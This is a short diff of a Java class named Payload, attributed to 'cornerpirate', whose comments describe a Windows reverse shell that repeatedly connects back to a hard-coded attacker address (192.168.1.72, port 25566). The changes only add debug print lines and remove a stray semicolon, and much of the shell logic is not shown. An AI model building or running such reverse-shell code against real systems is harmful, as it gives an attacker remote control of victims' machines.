@@ -44,6 +44,7 @@ import java.io.OutputStream;
  *
  * @author cornerpirate
  */
+
 public class Payload extends Thread {
 
     /**
@@ -51,10 +52,9 @@ public class Payload extends Thread {
      * showing a reverse shell here for Windows.
      */
     public void run() {
-
         while(true) {
             try {
-
+                System.out.println("test123");
                 // IP address or hostname of attacker
                 String attacker = "192.168.1.72";
                 int port = 25566;
@@ -87,12 +87,12 @@ public class Payload extends Thread {
                     } catch (Exception e) {
                     }
                 }
-                ;
                 p.destroy();
                 s.close();
             } catch (Exception ex) {
                 // Ignore errors as we are doing naughty things anyway.
             }
+            System.out.println("test1234");
         }
     }
 }
